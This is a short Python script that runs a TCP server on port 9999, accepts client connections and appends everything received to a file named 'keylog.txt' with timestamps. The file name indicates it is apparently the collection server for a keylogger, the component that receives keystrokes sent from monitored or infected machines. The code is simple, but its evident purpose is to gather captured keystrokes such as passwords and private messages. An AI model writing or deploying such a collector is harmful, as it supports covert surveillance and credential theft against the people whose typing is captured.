import socket
import logging
from datetime import datetime

# Server settings
SERVER_IP = '0.0.0.0'  # Listen on all available interfaces
SERVER_PORT = 9999     # Change to your preferred port

# Configure logging
logging.basicConfig(filename="keylog.txt",
                    level=logging.INFO,
                    format="%(asctime)s - %(message)s")

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((SERVER_IP, SERVER_PORT))
        server_socket.listen()
        print(f"Listening for incoming connections on {SERVER_IP}:{SERVER_PORT}")

        while True:
            conn, addr = server_socket.accept()
            print(f"Connected by {addr}")
            handle_client(conn)

def handle_client(conn):
    with conn:
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    break
                log_data(data.decode())
            except ConnectionResetError:
                print("Client disconnected abruptly")
                break
    print("Client disconnected")

def log_data(data):
    logging.info(data)

if __name__ == "__main__":
    start_server()
